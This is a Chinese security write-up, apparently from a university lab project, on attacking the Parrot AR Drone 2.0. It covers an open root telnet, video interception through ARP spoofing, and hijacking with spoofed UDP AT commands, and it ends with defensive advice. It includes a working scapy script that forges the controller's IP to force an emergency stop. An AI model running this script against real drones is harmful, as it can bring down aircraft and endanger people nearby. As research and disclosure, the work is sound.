# 如何渗透一台无人机

笔者今年 7 月在新国大玩儿了一段时间，跟着搞网安的 Hugh Anderson 教授玩了玩无人机。教授手上有一堆大大小小的无人机，其中最高级的是法国 Parrot 公司的 AR Drone2.0。在两周时间里我实现了对这台无人机的视频信号拦截与航行劫持，主要是基于无人机本身缺心眼的安全设置和脆弱的通信协议。  

# AR Drone 2.0 介绍

AR Drone 2.0 使用一个**没有加密**的 2.4 GHz Wi-Fi 与控制器通讯，控制器是安装了官方 App “AR.FreeFlight” 的 iOS 或安卓设备，其控制界面如图所示：

![](../Images/85dd459d40618224f06dabf6cd211f76.png)

飞行器搭载的操作系统为**BusyBox V1.14.0**，是一个基于 Linux 内核(v2.6.27.44)的小型操作系统。  

既然是 Linux，那可以搞的事情可就多了。如果能连上系统，执行命令，那岂不是可以为所欲为了。但是这么致命的问题，厂商肯定会封端口或者加密码来避免的吧！

而实际上……厂商啥都没做。在扫描了一通端口之后我们发现，**telnet**的 23 号端口明晃晃地敞开着。密码？不存在的。直连就是 root，爱干啥就能干啥。

![](../Images/952532fa835b61a8bfa01297884f7a6e.png)

理论上来讲这个敞开怀抱的 telnet 能让攻击者绕过无人机本身的通信机制直接接管系统，是一个致命的漏洞。我接下来的工作建立在 telnet 被禁用的前提下。  

# 攻击

## 窃听视频信号

在研究这个无人机之前，我研究了一个国产无人机 JJRC-H37 的图传机制。这个无人机也通过 Wi-Fi 与安装了官方 App 的控制设备通信，它会把视频信号以广播的形式同时发送给每一个接入 Wi-Fi 的设备。对于这一类无人机，不存在什么窃听，只要连接 Wi-Fi 便可以观看现场直播。

![](../Images/d249208f63aa5b508b6230997b97cc5e.png)

根据该 Ar Drone 2.0 的官方开发者文档，无人机的图传数据会从 5555 端口通过 TCP 发送到经过无人机认证的控制器。所谓的“认证”是指，可以有多个设备接入无人机产生的 Wi-Fi 网络，但是无人机只会把数据传输给给它发送控制指令的那台设备。再具体一些，**该无人机在同一时间只会与一个 IP 地址通信**。  

要想实现视频信号的窃听，只需要实施中间人攻击，诱骗无人机将数据发送给攻击者的设备即可。

具体的攻击步骤如下：

1.  攻击者连接无人机的 Wi-Fi
    
2.  通过扫面内网确定无人机和控制器的 IP 地址
    
3.  使用 ARP 欺骗攻击
    
4.  解码视频流数据
    

我使用 Ettercap 来实施中间人攻击。假设无人机的 IP 地址为 192.168.1.1，控制器的 IP 地址为 192.168.1.2，Ettercap 的配置如图所示：

## 劫持攻击  

根据开发者文档，控制器通过 5556 端口向无人机的 5556 端口通过 UDP 发送控制信号，控制无人机起飞、降落、急停、转向等关键操作。这些命令被称为“AT commands”。

由于 UDP 是一个“不靠谱的”协议，无法保证控制信号的先后顺序，该无人机的通信协议为每个控制信号递增地附加了一个“序列号”，序列号越高的控制信号优先级越高。具体的通信机制举例如下所述：

*   控制器发送序列号为 1 的起飞信号时，被无人机接收，无人机起飞；
    
*   控制器发送序列号为 2 的转向信号；
    
*   控制器发送序列号为 3 的降落，被无人机接收，无人机准备降落；
    
*   无人机收到序列号为 2 的转向信号，由于目前收到的最高序列号为 3，所以忽略此转向信号。
    

**问题就出现在这个序列号机制上。**

只要攻击者构造一个序列高足够大的命令发送给无人机，就可以使无人机完全忽略原控制器发出的控制信号。

这里还有一个问题，无人机只会接受一个源 IP 的控制信号，所以攻击者不能直接用自己的 IP 发送控制信号，而需要在构造 UDP 包的时候将源 IP 字段改为此时控制器的 IP 地址。

由此得出劫持攻击的攻击流程：

1.  攻击者连接无人机的 Wi-Fi
    
2.  通过扫面内网确定无人机和控制器的 IP 地址
    
3.  向无人机发送伪造的高序列号命令
    

![](../Images/da1be0906633da7ba7568710b5aa70e6.png)

控制飞行的信号格式如下：  

几个具体的控制信号如下表所示：

| 命令 || 功能 |
| --- | --- |
| <sequence>,290718208 || 起飞 |
| --- | --- |
| <sequence>,290717696 || 降落 |
| <sequence>,290717952 || 急停 |

我为了方便演示，使用 Python 的 scapy 库构造急停的控制信号，代码如下：

```
from scapy.all import \*
from time import sleep

srcIP = '192.168.1.2'  # spoofed source IP address
dstIP = '192.168.1.1'  # destination IP address
srcPort = 5556  # source port
dstPort = 5556  # destination port

for i in range(1, 10):
    payload = "AT\*REF=" + str(1000000+i) + ",290717952\\r"
    print payload
    spoofed\_packet = IP(src=srcIP, dst=dstIP) / \\
        UDP(sport=srcPort, dport=dstPort) / payload
    send(spoofed\_packet)
    sleep(0.3)
```

# 防御措施  

关掉 telnet！关掉 telnet！关掉 telnet！

对于无人机本身的 Wi-Fi 来说，其应该加密，如果攻击者无法方便地接入 Wi-Fi，那么这些攻击将难以实施。

一种更安全的做法是借助另一个可靠的 Wi-Fi 接入点，让无人机和控制器接入这个 Wi-Fi 网络之后，再彼此进行通信。
